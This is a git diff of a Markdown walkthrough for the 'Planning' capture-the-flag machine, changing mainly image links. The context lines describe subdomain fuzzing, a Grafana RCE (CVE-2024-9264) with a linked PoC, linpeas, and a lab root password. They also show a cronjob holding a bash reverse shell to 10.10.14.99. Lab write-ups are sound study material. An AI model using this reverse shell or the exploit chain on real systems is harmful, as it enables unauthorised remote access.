@@ -1,5 +1,6 @@
 
-![[Pasted image 20250720121032.png]]
+![Planning image](../Pasted%20image%2020250720121032.png)
+<!--![[Pasted image 20250720121032.png]]-->
 
 #### Machine Information
 
@@ -47,7 +48,8 @@ The site is not a recognizable host so I added it in the **/etc/hosts** director
 
 
 After reloading I was able to access the site.
-![[Pasted image 20250720124109.png]]
+![Planning image](../Pasted%20image%2020250720124109.png)
+<!--![[Pasted image 20250720124109.png]]-->
 I looked for low hanging fruits in the site itself but I didn't see anything interesting.
 
 #### Fuzzing the subdomain
@@ -88,11 +90,13 @@ I got grafana from the ffuf result. I added it also in the known hosts under **/
 
 #### Accessing the 'grafana' subdomain
 Upon accessing the 'http://grafana.planning.htb', I was prompted to the Grafana login page as shown below:
-![[Pasted image 20250720150949.png]]
+![Planning image](../Pasted%20image%2020250720150949.png)
+<!--![[Pasted image 20250720150949.png]]-->
 
 Since the Username and Password was given in the Machine information, I logged in and tried to if there are any more clues. I noticed the Grafana version in the bottom part of the login page. You can also see it on the question mark "?" icon on the upper right part of the Grafana Homepage.
 
-![[Pasted image 20250720152116.png]]
+![Planning image](../Pasted%20image%2020250720152116.png)
+<!--![[Pasted image 20250720152116.png]]-->
 
 Upon searching the internet, it seems that it was a vulnerable version of Grafana which allows attackers to gain RCE in the system. This vulnerability is based on the CVE-2024-9264. I saw github exploits/PoC in this link: [(CVE-2024–9264)](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit/blob/main/poc.py).
 
@@ -232,7 +236,8 @@ enzo@planning:~$ ./linpeas.sh
 ```
 
 Running linpeas, I got the following information:
-![[Pasted image 20250720163141.png]]
+![Planning image](../Pasted%20image%2020250720163141.png)
+<!--![[Pasted image 20250720163141.png]]-->
 
 Reading it and we got the following:
 ```ssh-access
@@ -241,8 +246,9 @@ enzo@planning:~$ cat /opt/crontabs/crontab.db
 {"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
 ```
 
-I ran linpeas again to look for open ports which might be hosting a local web server and I found this:
-![[Pasted image 20250720163714.png]]
+I checked linpeas again to look for open ports which might be hosting a local web server and I found this:
+![Planning image](../Pasted%20image%2020250720163714.png)
+<!--![[Pasted image 20250720163714.png]]-->
 
 It looks like there’s a web server running on port 8000. I've set up port forwarding to my kali machine to access the service on port 8000.
 
@@ -258,7 +264,8 @@ To access the server, I just accessed the localhost on port 8000 on my kali's br
 "root:P4ssw0rdS0pRi0T3c"
 
 Then we can see this page:
-![[Pasted image 20250720164325.png]]
+![Planning image](../Pasted%20image%2020250720164325.png)
+<!--![[Pasted image 20250720164325.png]]-->
 
 As you can see, there was a created cronjobs with a random name and it contains our shell which is the "bash -c 'exec bash -i &>/dev/tcp/10.10.14.99/8888 <&1'"
 
